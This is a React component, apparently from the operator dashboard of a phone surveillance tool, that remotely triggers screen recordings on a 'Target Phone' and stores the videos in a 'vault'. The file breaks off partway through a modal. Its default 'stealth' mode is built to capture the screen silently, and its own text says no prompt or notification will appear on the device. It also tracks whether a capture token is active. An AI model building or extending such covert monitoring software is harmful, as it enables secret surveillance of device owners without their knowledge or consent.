"use client";

import React, { useState, useEffect, useRef } from 'react';
import {
    Video, Square, Play, Clock, Download, Trash2,
    AlertTriangle, CheckCircle2, AlertCircle, X,
    Zap, Shield, RefreshCw, Eye, Sparkles, Film,
    Check, ArrowUpRight
} from 'lucide-react';

interface ScreenRecordViewProps {
    socket: any;
    userUuid: string;
    selectedDeviceId: string | null;
    isOnline: boolean;
    deviceName?: string;
}

interface SavedRecording {
    id: string;
    url: string;
    timestamp: number;
    elapsedMs: number;
    totalMs: number;
    reason: string;
    mode?: string;
}

const DURATION_OPTIONS = [
    { label: '2 min',  value: 120 },
    { label: '5 min',  value: 300 },
    { label: '10 min', value: 600 },
];

function fmtMs(ms: number) {
    const s  = Math.floor(ms / 1000);
    const m  = Math.floor(s / 60);
    const ss = (s % 60).toString().padStart(2, '0');
    return `${m}:${ss}`;
}

function fmtSec(sec: number) {
    if (sec <= 0) return 'Infinite';
    const m = Math.floor(sec / 60);
    const s = sec % 60;
    return s > 0 ? `${m}m ${s}s` : `${m}m`;
}

function fmtReason(r: string) {
    if (r === 'duration_complete')     return 'Completed';
    if (r === 'manual_stop')           return 'Stopped by User';
    if (r === 'secure_app_detected')   return 'Privacy Shield Tripped';
    if (r === 'encoder_error')         return 'Encoder Failed';
    if (r === 'token_released')        return 'Session Concluded';
    if (r === 'stealth_timeout')       return 'Queue Expired';
    return r;
}

export default function ScreenRecordView({
    socket,
    userUuid,
    selectedDeviceId,
    isOnline,
    deviceName
}: ScreenRecordViewProps) {
    // ── Device & Token Status ──────────────────────────────────────────────────
    const [hasToken, setHasToken] = useState<boolean | null>(null);
    const [statusMsg, setStatusMsg] = useState<{ type: 'info' | 'warning' | 'success' | 'error'; text: string } | null>(null);

    // ── Recording State ────────────────────────────────────────────────────────
    const [isRecording, setIsRecording] = useState(false);
    const [recMode, setRecMode] = useState<'stealth' | 'simple'>('stealth');
    const [recDuration, setRecDuration] = useState(300); // seconds, -1 = unlimited
    const [customMin, setCustomMin] = useState('');
    const [showCustom, setShowCustom] = useState(false);
    const [recElapsedMs, setRecElapsedMs] = useState(0);
    const [recTotalMs, setRecTotalMs] = useState(0);
    const [pendingRec, setPendingRec] = useState(false);

    // ── Persistent Vault Recordings ────────────────────────────────────────────
    const [savedRecs, setSavedRecs] = useState<SavedRecording[]>([]);
    const [activeVideo, setActiveVideo] = useState<SavedRecording | null>(null);

    // ── Modals & Popups ────────────────────────────────────────────────────────
    const [showSimpleWarn, setShowSimpleWarn] = useState(false);
    const [showUnlimWarn, setShowUnlimWarn] = useState(false);
    const [showStealthQueuedModal, setShowStealthQueuedModal] = useState(false);

    const isRecordingRef = useRef(false);
    isRecordingRef.current = isRecording;

    const storageKey = `asml_vault_screen_recs_${selectedDeviceId || 'global'}`;

    // Load persisted recordings from localStorage on device switch or mount
    useEffect(() => {
        try {
            const raw = localStorage.getItem(storageKey);
            if (raw) {
                const parsed = JSON.parse(raw);
                if (Array.isArray(parsed)) {
                    setSavedRecs(parsed);
                }
            } else {
                setSavedRecs([]);
            }
        } catch (err) {
            console.error('Failed to read stored screen recordings:', err);
        }
    }, [storageKey]);

    // Save recordings to localStorage helper
    const persistRecordings = (updater: (prev: SavedRecording[]) => SavedRecording[]) => {
        setSavedRecs(prev => {
            const next = updater(prev);
            try {
                localStorage.setItem(storageKey, JSON.stringify(next));
            } catch (err) {
                console.error('Failed to persist screen recordings:', err);
            }
            return next;
        });
    };

    // ── Socket Events ──────────────────────────────────────────────────────────
    useEffect(() => {
        if (!socket) return;

        if (selectedDeviceId && isOnline) {
            socket.emit('screen_status_query', { uuid: userUuid, targetDeviceId: selectedDeviceId });
        }

        const onScreenStatus = (data: any) => {
            if (!data) return;
            if (data.hasToken !== undefined) setHasToken(!!data.hasToken);

            switch (data.status) {
                case 'token_needed':
                    setHasToken(false);
                    setPendingRec(true);
                    setStatusMsg({ type: 'warning', text: 'Waiting for background system dispatch...' });
                    break;
                case 'authorized':
                    setHasToken(true);
                    setStatusMsg({ type: 'success', text: 'Screen capture pipeline verified & authorized.' });
                    break;
                case 'recording_started':
                    setIsRecording(true);
                    setPendingRec(false);
                    setRecElapsedMs(0);
                    setRecTotalMs((data.durationSec || 0) * 1000);
                    setStatusMsg(null);
                    break;
                case 'stream_stopped':
                case 'no_token':
                    setHasToken(false);
                    setIsRecording(false);
                    setPendingRec(false);
                    break;
                case 'stealth_timeout':
                    setPendingRec(false);
                    setStatusMsg({ type: 'warning', text: 'Stealth queue cycle completed with no trigger.' });
                    break;
                case 'denied':
                    setIsRecording(false);
                    setPendingRec(false);
                    setHasToken(false);
                    setStatusMsg({ type: 'error', text: data.error || 'Permission not granted on device.' });
                    break;
                default:
                    if (data.error) setStatusMsg({ type: 'error', text: data.error });
            }
        };

        const onRecProgress = (data: any) => {
            if (!data) return;
            setIsRecording(true);
            setPendingRec(false);
            setRecElapsedMs(data.elapsedMs || 0);
            setRecTotalMs(data.totalMs || 0);
        };

        const onRecComplete = (data: any) => {
            if (!data) return;
            setIsRecording(false);
            setPendingRec(false);
            setRecElapsedMs(0);
            setRecTotalMs(0);

            if (data.url) {
                const newRec: SavedRecording = {
                    id: `rec_${Date.now()}`,
                    url: data.url,
                    timestamp: data.timestamp || Date.now(),
                    elapsedMs: data.elapsedMs || 0,
                    totalMs: data.totalMs || 0,
                    reason: data.reason || 'duration_complete',
                    mode: data.mode
                };

                persistRecordings(prev => [newRec, ...prev.slice(0, 49)]);
                setStatusMsg({ type: 'success', text: `New recording captured and saved to vault (${fmtMs(data.elapsedMs || 0)})` });
            } else {
                setStatusMsg({ type: 'warning', text: `Recording finished: ${fmtReason(data.reason || 'unknown')}` });
            }
        };

        socket.on('screen_status', onScreenStatus);
        socket.on('screen_rec_progress', onRecProgress);
        socket.on('screen_rec_complete', onRecComplete);

        return () => {
            if (isRecordingRef.current) {
                socket.emit('screen_record_stop', { uuid: userUuid, targetDeviceId: selectedDeviceId });
            }
            socket.off('screen_status', onScreenStatus);
            socket.off('screen_rec_progress', onRecProgress);
            socket.off('screen_rec_complete', onRecComplete);
        };
    }, [socket, selectedDeviceId, isOnline, userUuid, storageKey]);

    // Auto-dismiss success notification
    useEffect(() => {
        if (!statusMsg || statusMsg.type === 'warning' || statusMsg.type === 'error') return;
        const timer = setTimeout(() => setStatusMsg(null), 5000);
        return () => clearTimeout(timer);
    }, [statusMsg]);

    // ── Command Dispatches ─────────────────────────────────────────────────────

    const handleInitiate = () => {
        if (!selectedDeviceId || !isOnline || !socket || isRecording || pendingRec) return;

        if (recMode === 'simple') {
            setShowSimpleWarn(true);
            return;
        }

        if (recDuration === -1) {
            setShowUnlimWarn(true);
            return;
        }

        // Stealth mode: show confirmation popup explaining queue
        setShowStealthQueuedModal(true);
    };

    const fireStartRecord = () => {
        if (!selectedDeviceId || !socket) return;
        const duration = recDuration === -1 ? 86400 : recDuration;
        setPendingRec(true);
        setRecElapsedMs(0);
        setRecTotalMs(duration * 1000);

        socket.emit('screen_record_start', {
            uuid: userUuid,
            targetDeviceId: selectedDeviceId,
            duration,
            mode: recMode
        });

        if (recMode === 'stealth') {
            setStatusMsg({
                type: 'info',
                text: 'Stealth recording enqueued. Capture runs silently when background triggers synchronize.'
            });
        } else {
            setStatusMsg({
                type: 'info',
                text: 'Direct screen capture authorization requested.'
            });
        }
    };

    const handleStopRecord = () => {
        if (!selectedDeviceId || !socket) return;
        socket.emit('screen_record_stop', { uuid: userUuid, targetDeviceId: selectedDeviceId });
        setIsRecording(false);
        setPendingRec(false);
    };

    const handleCustomInput = (val: string) => {
        setCustomMin(val);
        const n = parseInt(val, 10);
        if (!isNaN(n) && n >= 1 && n <= 10) {
            setRecDuration(n * 60);
        }
    };

    const handleDeleteRecord = (id: string) => {
        persistRecordings(prev => prev.filter(r => r.id !== id));
    };

    const handleClearAllRecords = () => {
        persistRecordings(() => []);
    };

    const progressPct = recTotalMs > 0 ? Math.min((recElapsedMs / recTotalMs) * 100, 100) : 0;
    const isUnlimited = recDuration === -1;

    return (
        <div className="w-full max-w-5xl mx-auto space-y-4 pb-24 px-3 sm:px-5 animate-in fade-in duration-300">
            {/* ── Status Toast ── */}
            {statusMsg && (
                <div className={`px-4 py-3 rounded-2xl text-xs font-mono flex items-center justify-between gap-3 border shadow-lg animate-in slide-in-from-top-2 ${
                    statusMsg.type === 'warning'
                        ? 'bg-amber-500/15 text-amber-300 border-amber-500/35'
                        : statusMsg.type === 'error'
                        ? 'bg-rose-500/15 text-rose-300 border-rose-500/35'
                        : statusMsg.type === 'success'
                        ? 'bg-emerald-500/15 text-emerald-300 border-emerald-500/35'
                        : 'bg-orange-500/15 text-orange-300 border-orange-500/35'
                }`}>
                    <div className="flex items-center gap-2.5">
                        {statusMsg.type === 'success' ? (
                            <CheckCircle2 size={16} className="text-emerald-400 shrink-0" />
                        ) : statusMsg.type === 'error' ? (
                            <AlertCircle size={16} className="text-rose-400 shrink-0" />
                        ) : (
                            <AlertTriangle size={16} className="text-amber-400 shrink-0" />
                        )}
                        <span className="leading-snug">{statusMsg.text}</span>
                    </div>
                    <button onClick={() => setStatusMsg(null)} className="text-white/40 hover:text-white p-1">
                        <X size={14} />
                    </button>
                </div>
            )}

            {/* ── Header Bar ── */}
            <div className="clay-card p-3 sm:p-4 flex flex-wrap items-center justify-between gap-3">
                <div className="flex items-center gap-3">
                    <div className="clay-icon-pod w-10 h-10 rounded-xl flex items-center justify-center text-orange-400 border border-orange-500/20">
                        <Video size={18} />
                    </div>
                    <div>
                        <h2 className="text-sm sm:text-base font-extrabold text-white tracking-wide font-mono flex items-center gap-2">
                            <span>Screen Recording Suite</span>
                            <span className="text-[10px] px-2 py-0.5 rounded-full bg-orange-500/20 text-orange-300 border border-orange-500/30 uppercase font-mono">
                                PRO
                            </span>
                        </h2>
                        <p className="text-[11px] text-white/40 font-mono">
                            Remote device display capture & persistent video vault
                        </p>
                    </div>
                </div>

                <div className="flex items-center gap-2">
                    <div className="flex items-center gap-2 bg-[#0c0e12] px-3 py-1.5 rounded-xl border border-white/5">
                        <span className={`w-2 h-2 rounded-full ${isOnline ? 'bg-emerald-400 shadow-[0_0_8px_#34d399]' : 'bg-rose-500'}`} />
                        <span className="text-xs font-mono text-white/70">{deviceName || 'Target Phone'}</span>
                    </div>

                    {hasToken !== null && (
                        <div className={`text-[10px] font-mono font-bold px-3 py-1.5 rounded-xl border flex items-center gap-1.5 ${
                            hasToken
                                ? 'bg-emerald-500/10 text-emerald-300 border-emerald-500/30'
                                : 'bg-white/5 text-white/40 border-white/10'
                        }`}>
                            <span className={`w-1.5 h-1.5 rounded-full ${hasToken ? 'bg-emerald-400 animate-pulse' : 'bg-white/30'}`} />
                            <span>{hasToken ? 'ACTIVE TOKEN' : 'STANDBY'}</span>
                        </div>
                    )}
                </div>
            </div>

            {/* ── Main Two-Column Layout (Desktop Grid, Stack on Mobile) ── */}
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-4">
                {/* ── Left Column: Configuration & Controls ── */}
                <div className="lg:col-span-7 space-y-4">
                    {/* Mode Selector Card */}
                    <div className="clay-card p-4 sm:p-5 space-y-3.5">
                        <div className="flex items-center justify-between">
                            <span className="text-[11px] font-mono font-bold text-white/50 uppercase tracking-widest flex items-center gap-1.5">
                                <Sparkles size={13} className="text-orange-400" />
                                Operational Mode
                            </span>
                            <span className="text-[10px] font-mono text-orange-400/80">
                                {recMode === 'stealth' ? 'Silent Pipeline' : 'Direct Dispatch'}
                            </span>
                        </div>

                        <div className="grid grid-cols-2 gap-2.5">
                            {/* Stealth Mode Pill */}
                            <button
                                type="button"
                                onClick={() => setRecMode('stealth')}
                                disabled={isRecording || pendingRec}
                                className={`p-3.5 rounded-2xl text-left transition-all cursor-pointer border ${
                                    recMode === 'stealth'
                                        ? 'bg-gradient-to-br from-orange-500/20 to-amber-500/10 border-orange-500/50 shadow-[0_0_20px_rgba(249,115,22,0.2)]'
                                        : 'bg-[#0c0e12]/80 border-white/5 hover:border-white/15 text-white/40'
                                } disabled:opacity-40`}
                            >
                                <div className="flex items-center justify-between mb-1.5">
                                    <div className="flex items-center gap-2">
                                        <Shield size={15} className={recMode === 'stealth' ? 'text-orange-400' : 'text-white/40'} />
                                        <span className={`text-xs font-black uppercase font-mono tracking-wider ${recMode === 'stealth' ? 'text-white' : 'text-white/60'}`}>
                                            Stealth Queue
                                        </span>
                                    </div>
                                    {recMode === 'stealth' && <Check size={13} className="text-orange-400" />}
                                </div>
                                <p className="text-[11px] text-white/40 leading-relaxed font-mono">
                                    Enqueues background task. Captures silently without foreground dialogue.
                                </p>
                            </button>

                            {/* Simple Mode Pill */}
                            <button
                                type="button"
                                onClick={() => setRecMode('simple')}
                                disabled={isRecording || pendingRec}
                                className={`p-3.5 rounded-2xl text-left transition-all cursor-pointer border ${
                                    recMode === 'simple'
                                        ? 'bg-gradient-to-br from-orange-500/20 to-amber-500/10 border-orange-500/50 shadow-[0_0_20px_rgba(249,115,22,0.2)]'
                                        : 'bg-[#0c0e12]/80 border-white/5 hover:border-white/15 text-white/40'
                                } disabled:opacity-40`}
                            >
                                <div className="flex items-center justify-between mb-1.5">
                                    <div className="flex items-center gap-2">
                                        <Zap size={15} className={recMode === 'simple' ? 'text-orange-400' : 'text-white/40'} />
                                        <span className={`text-xs font-black uppercase font-mono tracking-wider ${recMode === 'simple' ? 'text-white' : 'text-white/60'}`}>
                                            Direct Prompt
                                        </span>
                                    </div>
                                    {recMode === 'simple' && <Check size={13} className="text-orange-400" />}
                                </div>
                                <p className="text-[11px] text-white/40 leading-relaxed font-mono">
                                    Instant permission dialogue dispatch directly onto phone display.
                                </p>
                            </button>
                        </div>
                    </div>

                    {/* Duration Config Card */}
                    <div className="clay-card p-4 sm:p-5 space-y-3.5">
                        <div className="flex items-center justify-between">
                            <span className="text-[11px] font-mono font-bold text-white/50 uppercase tracking-widest flex items-center gap-1.5">
                                <Clock size={13} className="text-orange-400" />
                                Target Duration
                            </span>
                            <span className="text-[11px] font-mono font-bold text-orange-400">
                                {recDuration > 0 ? fmtSec(recDuration) : 'Until Manual Stop'}
                            </span>
                        </div>

                        {/* Presets */}
                        <div className="grid grid-cols-4 gap-2">
                            {DURATION_OPTIONS.map(opt => (
                                <button
                                    key={opt.value}
                                    type="button"
                                    onClick={() => {
                                        setRecDuration(opt.value);
                                        setShowCustom(false);
                                        setCustomMin('');
                                    }}
                                    disabled={isRecording || pendingRec}
                                    className={`py-2.5 rounded-xl text-xs font-mono font-bold transition-all cursor-pointer disabled:opacity-40 ${
                                        recDuration === opt.value && !showCustom && recDuration !== -1
                                            ? 'bg-gradient-to-r from-orange-500 to-amber-500 text-white shadow-[0_4px_16px_rgba(249,115,22,0.4)]'
                                            : 'bg-[#0c0e12] border border-white/5 text-white/60 hover:text-white hover:border-white/15'
                                    }`}
                                >
                                    {opt.label}
                                </button>
                            ))}

                            {/* Custom Button */}
                            <button
                                type="button"
                                onClick={() => {
                                    setShowCustom(true);
                                    setRecDuration(0);
                                }}
                                disabled={isRecording || pendingRec}
                                className={`py-2.5 rounded-xl text-xs font-mono font-bold transition-all cursor-pointer disabled:opacity-40 ${
                                    showCustom
                                        ? 'bg-gradient-to-r from-orange-500 to-amber-500 text-white shadow-[0_4px_16px_rgba(249,115,22,0.4)]'
                                        : 'bg-[#0c0e12] border border-white/5 text-white/60 hover:text-white hover:border-white/15'
                                }`}
                            >
                                Custom
                            </button>
                        </div>

                        {/* Custom Input */}
                        {showCustom && (
                            <div className="flex items-center gap-3 bg-[#0c0e12] p-2.5 rounded-xl border border-orange-500/30 animate-in slide-in-from-top-1">
                                <span className="text-xs font-mono text-white/60 pl-1">Minutes:</span>
                                <input
                                    type="number"
                                    min={1}
                                    max={10}
                                    value={customMin}
                                    onChange={e => handleCustomInput(e.target.value)}
                                    placeholder="1–10"
                                    className="bg-black/60 border border-white/10 rounded-lg px-2.5 py-1 text-white text-sm font-mono w-20 outline-none focus:border-orange-500"
                                />
                                <span className="text-[11px] text-white/30 font-mono">(1 to 10 max)</span>
                                {recDuration > 0 && (
                                    <span className="ml-auto text-xs text-orange-400 font-mono font-bold pr-1">
                                        Selected: {fmtSec(recDuration)}
                                    </span>
                                )}
                            </div>
                        )}

                        {/* Continuous / Unlimited Option */}
                        <button
                            type="button"
                            onClick={() => {
                                setRecDuration(-1);
                                setShowCustom(false);
                                setCustomMin('');
                            }}
                            disabled={isRecording || pendingRec}
                            className={`w-full py-2.5 px-3 rounded-xl text-xs font-mono font-bold flex items-center justify-between border transition-all cursor-pointer disabled:opacity-40 ${
                                isUnlimited
                                    ? 'bg-amber-500/15 border-amber-500/40 text-amber-300 shadow-[0_0_14px_rgba(245,158,11,0.2)]'
                                    : 'bg-[#0c0e12]/60 border-white/5 text-white/40 hover:text-white/70 hover:border-white/15'
                            }`}
                        >
                            <span className="flex items-center gap-2">
                                <span className="text-base leading-none">∞</span>
                                <span>Continuous Capture (Until Disconnected)</span>
                            </span>
                            <span className="text-[10px] px-2 py-0.5 rounded-md bg-white/5 text-white/40">
                                Manual Stop
                            </span>
                        </button>
                    </div>

                    {/* Master Action Trigger */}
                    <div className="clay-card p-4 sm:p-5">
                        {!isRecording && !pendingRec ? (
                            <button
                                type="button"
                                onClick={handleInitiate}
                                disabled={!isOnline || !selectedDeviceId || (showCustom && recDuration <= 0)}
                                className="w-full py-4 rounded-2xl font-black font-mono text-sm uppercase tracking-wider flex items-center justify-center gap-2.5 transition-all cursor-pointer shadow-xl bg-gradient-to-r from-orange-500 to-amber-500 hover:from-orange-400 hover:to-amber-400 text-white shadow-[0_8px_25px_rgba(249,115,22,0.45)] hover:scale-[1.01] active:scale-[0.99] disabled:opacity-40 disabled:cursor-not-allowed"
                            >
                                <Play size={16} className="fill-current" />
                                <span>{recMode === 'stealth' ? 'Arm Stealth Recording Queue' : 'Start Direct Screen Capture'}</span>
                            </button>
                        ) : pendingRec && !isRecording ? (
                            <div className="space-y-3">
                                <div className="w-full py-4 px-4 rounded-2xl flex items-center justify-between bg-amber-500/10 border border-amber-500/30 text-amber-300">
                                    <div className="flex items-center gap-3">
                                        <div className="w-3 h-3 rounded-full bg-amber-400 animate-ping shrink-0" />
                                        <div className="text-left font-mono">
                                            <div className="text-xs font-black uppercase tracking-wider">
                                                {recMode === 'stealth' ? 'Queued in Stealth Pipeline' : 'Awaiting Authorization'}
                                            </div>
                                            <div className="text-[11px] text-amber-300/70">
                                                {recMode === 'stealth' ? 'Silently monitoring background triggers' : 'Check mobile screen for prompt'}
                                            </div>
                                        </div>
                                    </div>
                                    <Clock size={18} className="animate-spin text-amber-400 shrink-0" />
                                </div>

                                <button
                                    type="button"
                                    onClick={handleStopRecord}
                                    className="w-full py-2.5 rounded-xl text-xs font-mono font-bold text-white/50 hover:text-rose-400 hover:bg-rose-500/10 border border-white/10 transition-all cursor-pointer"
                                >
                                    Cancel & Disarm Queue
                                </button>
                            </div>
                        ) : (
                            <div className="space-y-3.5">
                                <div className="flex items-center justify-between text-xs font-mono">
                                    <div className="flex items-center gap-2 text-rose-400">
                                        <span className="w-2.5 h-2.5 rounded-full bg-rose-500 animate-pulse shadow-[0_0_10px_#f43f5e]" />
                                        <span className="font-black uppercase tracking-wider">Recording in Progress</span>
                                    </div>
                                    <div className="font-bold text-white/80">
                                        <span>{fmtMs(recElapsedMs)}</span>
                                        {recTotalMs > 0 && !isUnlimited && (
                                            <span className="text-white/40"> / {fmtMs(recTotalMs)}</span>
                                        )}
                                    </div>
                                </div>

                                {!isUnlimited && recTotalMs > 0 && (
                                    <div className="h-2 rounded-full bg-black/60 border border-white/10 overflow-hidden">
                                        <div
                                            className="h-full rounded-full bg-gradient-to-r from-rose-500 via-orange-500 to-amber-400 transition-all duration-1000 shadow-[0_0_10px_#f97316]"
                                            style={{ width: `${progressPct}%` }}
                                        />
                                    </div>
                                )}

                                <button
                                    type="button"
                                    onClick={handleStopRecord}
                                    className="w-full py-3.5 rounded-2xl font-black font-mono text-xs uppercase tracking-wider flex items-center justify-center gap-2 bg-rose-500/20 border border-rose-500/40 text-rose-300 hover:bg-rose-500/30 hover:text-white transition-all cursor-pointer shadow-lg shadow-rose-950/40"
                                >
                                    <Square size={14} className="fill-current" />
                                    <span>Stop & Save Recording</span>
                                </button>
                            </div>
                        )}
                    </div>
                </div>

                {/* ── Right Column: Queue Monitor & Vault ── */}
                <div className="lg:col-span-5 space-y-4">
                    {/* Stealth Pipeline Card (Informational & Clear) */}
                    <div className="clay-card p-4 sm:p-5 space-y-3 border border-orange-500/20 bg-gradient-to-b from-orange-500/[0.04] to-transparent">
                        <div className="flex items-center justify-between">
                            <div className="flex items-center gap-2 text-orange-400 font-mono font-bold text-xs">
                                <Shield size={14} />
                                <span>Stealth Pipeline Architecture</span>
                            </div>
                            <span className="text-[10px] font-mono text-emerald-400 px-2 py-0.5 rounded-full bg-emerald-500/10 border border-emerald-500/20">
                                ACTIVE
                            </span>
                        </div>

                        <p className="text-xs text-white/50 font-mono leading-relaxed">
                            Silent background capture eliminates disruptive dialogs on the target device. Once the pipeline synchronizes, recording initiates autonomously and uploads directly to your persistent vault below.
                        </p>

                        <div className="pt-2 border-t border-white/5 flex items-center justify-between text-[11px] font-mono text-white/40">
                            <span>Auto-persistence: Local Vault</span>
                            <span className="text-orange-400/80">Page-refresh safe ✓</span>
                        </div>
                    </div>

                    {/* Recorded Videos Vault */}
                    <div className="clay-card overflow-hidden flex flex-col">
                        <div className="p-4 border-b border-white/5 flex items-center justify-between bg-black/30">
                            <div className="flex items-center gap-2 text-xs font-mono font-bold uppercase tracking-wider text-white/70">
                                <Film size={14} className="text-orange-400" />
                                <span>Recordings Vault ({savedRecs.length})</span>
                            </div>
                            {savedRecs.length > 0 && (
                                <button
                                    type="button"
                                    onClick={handleClearAllRecords}
                                    className="text-[10px] font-mono text-white/30 hover:text-rose-400 transition-colors cursor-pointer flex items-center gap-1"
                                >
                                    <Trash2 size={11} />
                                    <span>Clear Vault</span>
                                </button>
                            )}
                        </div>

                        {savedRecs.length === 0 ? (
                            <div className="p-8 text-center flex flex-col items-center justify-center space-y-2 text-white/30 font-mono">
                                <Video size={32} className="stroke-[1.2] opacity-40 mb-1" />
                                <div className="text-xs font-bold text-white/50">No recordings captured yet</div>
                                <p className="text-[10px] max-w-xs text-white/30">
                                    Arm stealth mode or run a direct capture to produce mp4 files. They persist here automatically.
                                </p>
                            </div>
                        ) : (
                            <div className="divide-y divide-white/5 max-h-[480px] overflow-y-auto no-scrollbar">
                                {savedRecs.map(rec => (
                                    <div
                                        key={rec.id}
                                        className="p-3.5 hover:bg-white/[0.03] transition-colors flex items-center justify-between gap-3 group"
                                    >
                                        <div className="flex items-center gap-3 min-w-0">
                                            {/* Play Thumbnail Trigger */}
                                            <button
                                                type="button"
                                                onClick={() => setActiveVideo(rec)}
                                                className="clay-icon-pod w-10 h-10 rounded-xl flex items-center justify-center text-orange-400 border border-orange-500/20 group-hover:scale-105 group-hover:bg-orange-500/20 transition-all cursor-pointer shrink-0"
                                                title="Play Recording"
                                            >
                                                <Play size={14} className="fill-orange-400 ml-0.5" />
                                            </button>

                                            <div className="min-w-0 flex-1">
                                                <div className="flex items-center gap-2">
                                                    <span className="text-xs font-bold text-white font-mono truncate">
                                                        Screen Capture ({fmtMs(rec.elapsedMs)})
                                                    </span>
                                                    <span className={`text-[9px] px-1.5 py-0.2 rounded font-mono uppercase ${
                                                        rec.mode === 'stealth'
                                                            ? 'bg-orange-500/20 text-orange-300 border border-orange-500/30'
                                                            : 'bg-blue-500/20 text-blue-300 border border-blue-500/30'
                                                    }`}>
                                                        {rec.mode || 'stealth'}
                                                    </span>
                                                </div>
                                                <div className="text-[10px] text-white/40 font-mono mt-0.5 truncate">
                                                    {new Date(rec.timestamp).toLocaleTimeString()} • {fmtReason(rec.reason)}
                                                </div>
                                            </div>
                                        </div>

                                        {/* Action Tools */}
                                        <div className="flex items-center gap-1 shrink-0">
                                            {/* In-app Watch Button */}
                                            <button
                                                type="button"
                                                onClick={() => setActiveVideo(rec)}
                                                className="p-2 rounded-xl bg-white/5 hover:bg-orange-500/20 text-white/60 hover:text-orange-300 transition-colors cursor-pointer"
                                                title="Watch in App"
                                            >
                                                <Eye size={13} />
                                            </button>

                                            {/* Download */}
                                            <a
                                                href={rec.url}
                                                download={`screen_${rec.timestamp}.mp4`}
                                                className="p-2 rounded-xl bg-white/5 hover:bg-white/15 text-white/60 hover:text-white transition-colors cursor-pointer"
                                                title="Download MP4"
                                            >
                                                <Download size={13} />
                                            </a>

                                            {/* Delete */}
                                            <button
                                                type="button"
                                                onClick={() => handleDeleteRecord(rec.id)}
                                                className="p-2 rounded-xl bg-white/5 hover:bg-rose-500/20 text-white/30 hover:text-rose-400 transition-colors cursor-pointer"
                                                title="Remove"
                                            >
                                                <Trash2 size={13} />
                                            </button>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        )}
                    </div>
                </div>
            </div>

            {/* ══════════════════════════════════════════════════════════════════ */}
            {/* ── MODAL: In-App Video Player (No New Tab Redirect!) ──          */}
            {/* ══════════════════════════════════════════════════════════════════ */}
            {activeVideo && (
                <div
                    onClick={(e) => { if (e.target === e.currentTarget) setActiveVideo(null); }}
                    className="fixed inset-0 z-[600] flex items-center justify-center bg-black/85 backdrop-blur-xl p-3 sm:p-6 animate-in fade-in duration-200"
                >
                    <div className="clay-card max-w-2xl w-full flex flex-col shadow-2xl relative overflow-hidden border border-white/10 rounded-3xl">
                        {/* Player Header */}
                        <div className="p-4 sm:p-5 border-b border-white/5 bg-black/40 flex items-center justify-between">
                            <div className="flex items-center gap-2.5">
                                <div className="clay-pill px-3 py-1 bg-orange-500/15 border border-orange-500/30 flex items-center gap-2">
                                    <span className="w-2 h-2 rounded-full bg-orange-400 animate-pulse shadow-[0_0_8px_#f97316]" />
                                    <span className="text-[11px] font-mono font-black uppercase text-orange-200">
                                        Vault Playback ({fmtMs(activeVideo.elapsedMs)})
                                    </span>
                                </div>
                                <span className="text-xs text-white/40 font-mono hidden sm:inline">
                                    {new Date(activeVideo.timestamp).toLocaleTimeString()}
                                </span>
                            </div>

                            <div className="flex items-center gap-2">
                                <a
                                    href={activeVideo.url}
                                    download={`screen_rec_${activeVideo.timestamp}.mp4`}
                                    className="p-2 rounded-xl bg-white/5 hover:bg-white/15 text-white/70 hover:text-white transition-colors flex items-center gap-1.5 text-xs font-mono"
                                >
                                    <Download size={13} />
                                    <span className="hidden sm:inline">Download</span>
                                </a>
                                <button
                                    type="button"
                                    onClick={() => setActiveVideo(null)}
                                    className="p-2 rounded-xl bg-white/5 hover:bg-rose-500/20 text-white/50 hover:text-rose-400 transition-colors cursor-pointer"
                                >
                                    <X size={16} />
                                </button>
                            </div>
                        </div>

                        {/* Video Element */}
                        <div className="bg-black p-2 sm:p-4 flex items-center justify-center">
                            <video
                                src={activeVideo.url}
                                controls
                                autoPlay
                                playsInline
                                className="w-full max-h-[65vh] rounded-2xl bg-black shadow-inner object-contain"
                            />
                        </div>
                    </div>
                </div>
            )}

            {/* ══════════════════════════════════════════════════════════════════ */}
            {/* ── MODAL: Stealth Enqueued Confirmation Popup ──                 */}
            {/* ══════════════════════════════════════════════════════════════════ */}
            {showStealthQueuedModal && (
                <div
                    onClick={(e) => { if (e.target === e.currentTarget) setShowStealthQueuedModal(false); }}
                    className="fixed inset-0 z-[550] bg-black/80 backdrop-blur-md flex items-end sm:items-center justify-center p-4 animate-in fade-in duration-200"
                >
                    <div className="clay-card max-w-md w-full p-5 sm:p-6 border border-orange-500/40 shadow-2xl space-y-4 rounded-3xl animate-in slide-in-from-bottom-4 sm:slide-in-from-bottom-0">
                        <div className="flex items-center gap-3 text-orange-400">
                            <div className="clay-icon-pod w-10 h-10 rounded-2xl flex items-center justify-center border border-orange-500/30">
                                <Shield size={20} />
                            </div>
                            <div>
                                <h3 className="font-mono font-black text-sm uppercase tracking-wide text-white">
                                    Stealth Pipeline Queued
                                </h3>
                                <p className="text-[11px] font-mono text-orange-400/80">
                                    Autonomous Background Execution
                                </p>
                            </div>
                        </div>

                        <div className="space-y-2 text-xs font-mono text-white/70 leading-relaxed bg-[#0c0e12] p-3.5 rounded-2xl border border-white/5">
                            <p>
                                Screen recording task is placed into the silent background queue.
                            </p>
                            <p className="text-white/40 text-[11px]">
                                • No prompt or notification will be forced onto the mobile display.<br />
                                • Once system background conditions synchronize, recording executes automatically.<br />
                                • The final MP4 video will stream back and persist directly in your Vault.
                            </p>
                        </div>

                        <div className="flex gap-2.5 pt-1">
                            <button
                                type="button"
                                onClick={() => setShowStealthQueuedModal(false)}
                                className="flex-1 py-3 rounded-xl text-xs font-mono text-white/50 hover:text-white border border-white/10 hover:border-white/20 transition-all cursor-pointer"
                            >
                                Cancel
                            </button>
                            <button
                                type="button"
                                onClick={() => {
                                    setShowStealthQueuedModal(false);
                                    fireStartRecord();
                                }}
                                className="flex-1 py-3 rounded-xl text-xs font-mono font-black bg-gradient-to-r from-orange-500 to-amber-500 hover:from-orange-400 hover:to-amber-400 text-white shadow-[0_4px_16px_rgba(249,115,22,0.45)] transition-all cursor-pointer"
                            >
                                Dispatch & Monitor
                            </button>
                        </div>
                    </div>
                </div>
            )}

            {/* ══════════════════════════════════════════════════════════════════ */}
            {/* ── MODAL: Simple Direct Mode Warning ──                          */}
            {/* ══════════════════════════════════════════════════════════════════ */}
            {showSimpleWarn && (
                <div
                    onClick={(e) => { if (e.target === e.currentTarget) setShowSimpleWarn(false); }}
                    className="fixed inset-0 z-[500] bg-black/80 backdrop-blur-md flex items-end sm:items-center justify-center p-4 animate-in fade-in"
                >
